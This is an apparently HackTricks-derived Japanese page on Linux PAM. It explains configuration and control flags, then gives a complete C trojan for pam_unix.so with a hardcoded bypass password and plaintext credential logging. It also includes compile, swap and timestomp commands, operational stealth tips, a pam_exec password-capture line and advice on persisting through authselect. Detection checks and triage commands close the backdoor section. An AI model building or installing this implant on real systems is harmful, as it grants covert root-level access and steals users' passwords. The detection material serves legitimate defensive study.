# PAM - Pluggable Authentication Modules

### 基本情報

**PAM (Pluggable Authentication Modules)** は、**コンピューターサービスへのアクセスを試みるユーザーの身元を検証する**セキュリティメカニズムとして機能し、さまざまな基準に基づいてアクセスを制御します。これはデジタルの門番に似ており、認証されたユーザーだけが特定のサービスを利用できるようにすると同時に、システムの過負荷を防ぐために利用を制限する場合もあります。

#### 設定ファイル

- **Solaris** はレガシーな中央ファイル `/etc/pam.conf` をサポートしていますが、現在のガイダンスでは `/etc/pam.d` 配下のサービスファイルが推奨されています。<sup>[[10]](#references)</sup>
- **Linux systems** ではディレクトリ方式が推奨され、サービス固有の設定が `/etc/pam.d` 内に保存されます。たとえば、login service の設定ファイルは `/etc/pam.d/login` にあります。<sup>[[1]](#references)</sup>

login service の PAM 設定例は、次のようになります：
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

これらのrealm、つまりmanagement groupには **auth**、**account**、**password**、**session** が含まれ、それぞれauthenticationおよびsession managementプロセスの異なる側面を担当します:<sup>[[1]](#references)</sup>

- **Auth**: 多くの場合、passwordの入力を求めることで、user identityを検証します。
- **Account**: group membershipやtime-of-day restrictionsなどの条件を確認し、account verificationを処理します。
- **Password**: complexity checksやdictionary attacks preventionなど、password updatesを管理します。
- **Session**: directoryのmountやresource limitsの設定など、service sessionの開始時または終了時のアクションを管理します。

#### **PAM Module Controls**

Controlsはmoduleの成功または失敗に対するresponseを決定し、authentication process全体に影響を与えます。これには以下が含まれます:<sup>[[1]](#references)</sup>

- **Required**: required moduleが失敗すると、後続のすべてのmoduleがチェックされた後に最終的な失敗となります。
- **Requisite**: 失敗すると、processが直ちに終了します。
- **Sufficient**: それ以前の `required` moduleが失敗していない場合、成功すると直ちにreturnし、同じmanagement group内の残りのmoduleをskipします。
- **Optional**: stack内で唯一のmoduleである場合にのみ失敗を引き起こします。

#### Offensive Semantics That Matter

PAMを分析または変更する際、**挿入されたruleの位置**によって、どのstackがそれを認識するかが決まります:<sup>[[1]](#references)[[13]](#references)</sup>

- `include`と`substack`は他のfileからruleを取り込むため、`sshd`を編集するとSSHにのみ影響する一方、`system-auth`、`common-auth`、またはその他のshared stackを編集すると、複数のserviceに一度に影響する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>
- PAMは `[success=1 default=ignore]` のようなbracketed controlsもサポートします。これらは、`pam_unix.so`を明確に置き換えるのではなく、custom checkが成功した後に**1つ以上のmoduleをskip**するために悪用できます。<sup>[[1]](#references)</sup>
- `module-path`は**absolute**（`/usr/lib/security/pam_custom.so`）またはdefault PAM module directoryからの**relative**にできます。modern Linux systemでは、実際のdirectoryは多くの場合、`/lib/security`、`/lib64/security`、`/usr/lib/security`、または`/usr/lib/x86_64-linux-gnu/security`のようなmultiarch pathです。<sup>[[1]](#references)[[14]](#references)</sup>

Quick operator takeaway: patchする前に、必ず**full service graph**をmapしてください。例えば、一部のdistroでは `sshd -> password-auth -> system-auth`、別のdistroでは `sshd -> system-remote-login -> system-login -> system-auth` となるため、同じone-line implantが意図した範囲よりもはるかに広く波及する可能性があります。<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

複数のauth moduleを含むsetupでは、processは厳密な順序に従います。`pam_securetty` moduleがlogin terminalをunauthorizedと判断すると、root loginはblockされますが、`required` statusであるため、すべてのmoduleの処理は継続されます。`pam_env`はenvironment variablesを設定し、user experienceの向上に役立つ可能性があります。`pam_ldap`と`pam_unix` moduleは連携してuserをauthenticateし、`pam_unix`は以前に提供されたpasswordの使用を試みることで、authentication methodsの効率性と柔軟性を高めます。<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## PAMのBackdooring – `pam_unix.so`のHooking

high-value Linux environmentにおけるclassic persistence trickは、**legitimate PAM libraryをtrojanised drop-inとswapする**ことです。PAM stackが`pam_unix.so`をloadするhostでは、SSHまたはconsole authenticationがその`pam_sm_authenticate()` entry pointをinvokeできます。malicious replacementはcredentialsをcaptureしたり、*magic* password bypassを実装したりできます。<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
以下のsketchでは、Linux-PAMの`pam_sm_authenticate()` service entry pointと、authentication tokenにaccessするための`pam_get_authtok()`を使用します。<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
コンパイルして stealth-replace（replacement/timestomp パターンは Unit 42 によって文書化されています）。wrapper にハードコードされたバックアップパスと、以下のコマンドの両方を、対象の実際の PAM module ディレクトリに合わせて調整します。<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – 完全なライブラリを一時ファイルに書き込み、それを所定の場所へ rename することで、部分的にしか書き込まれていない authentication module を残さない。
2. Unit 42 の AuthDoor analysis では `/usr/bin/.dbus.log` のような path が確認されているため、これは有用な hunting indicator でもある。<sup>[[2]](#references)</sup>
3. PAM stack が想定する entry point（例: `pam_sm_authenticate` や `pam_sm_setcred`）を保持し、他の management operation が引き続き機能するようにする。<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
package-integrity check では、RPM が installed-file metadata を検証し、`debsums -s` が checksum error を報告し、triage block 内の `dpkg -S` が package ownership を照会する。また、audit watch syntax は path への write と attribute change を記録する。<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` の MD5/SHA256 を distro package と比較する。
* `rpm -V pam` または `debsums -s libpam-modules` を使用して、manual hashing なしで置き換えられた library を検出する。
* `/lib/security/` 配下に world-writable または通常と異なる ownership がないか確認する。
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* 予期しない module がないか PAM config を Grep する: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

### Quick triage commands (post-compromise または threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### 永続化のための `pam_exec` の悪用
`pam_unix.so` を置き換える代わりに、`/etc/pam.d/sshd` に `pam_exec` の行を追加するという、より控えめな方法があります。これにより、その PAM 行に到達した呼び出しでヘルパーが実行され、通常の stack はそのまま維持されます。<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は、`PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY`、`PAM_TYPE` などの環境変数で PAM metadata を受け取ります。`expose_authtok` を指定すると、`auth` または `password` phase 中に、helper は `stdin` から最大 `PAM_MAX_RESP_SIZE` bytes の password を読み取れます。helper を real UID ではなく effective UID で実行する場合は、`seteuid` を追加します。<sup>[[4]](#references)</sup>

以下は、`pam_exec` で documented されている module types と `type=` filter に関する実践的な注意点です:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` は、socket の再オープンや detached daemon の spawn などの **post-login actions** に適しています。
- `auth optional pam_exec.so quiet expose_authtok ...` は、session が開く前に実行されるため、**credential capture** に通常使用されます。
- `type=session` または `type=auth` を使用すると、実行を特定の PAM phase に限定し、noisy な二重実行を回避できます。

### distro tooling を生き残る: `authselect`

`authselect` を使用する RHEL および Fedora-family systems では、`/etc/pam.d/system-auth` や `/etc/pam.d/password-auth` などの generated files を直接編集しても、**`authselect` によって上書きされる**可能性があります。永続化するには、通常 `/etc/authselect/custom/<profile>/` 配下の active custom profile に patch を適用し、その後で再選択します。<sup>[[5]](#references)[[19]](#references)</sup>

root がある場合の一般的な workflow:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
これは攻撃と triage の両方に関係します。`/etc/pam.d/system-auth` に `Generated by authselect` と `Do not modify this file manually` という banner が含まれている場合、実際の persistence point は `/etc/pam.d/` ではなく、`/etc/authselect/custom/` 配下に存在する可能性があります。<sup>[[5]](#references)</sup>

### Recent tradecraft seen in the wild

2025年に報告された **Plague** Linux backdoor では、同じ基本概念がさらに発展していました。悪意のある PAM component に **static bypass password** が組み込まれ、さらに SSH 関連の環境変数と shell history（`HISTFILE=/dev/null`）を cleanup して、login 後の session traces を減らしていました。<sup>[[3]](#references)</sup> これは有用な hunting pattern です。backdoor の logic は PAM 内に存在する一方で、stealth artifacts は authentication が成功した **後** にのみ現れる可能性があるためです。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Covert Operator's Playbook: グローバル通信ネットワークへの Infiltration - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Linux 向けに新たに発見された PAM-Based Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect を使用した user authentication の設定 - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux manual page](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4 での Authentication の管理](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [System-Level Authentication Guide - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu package file list: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM マニュアル](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
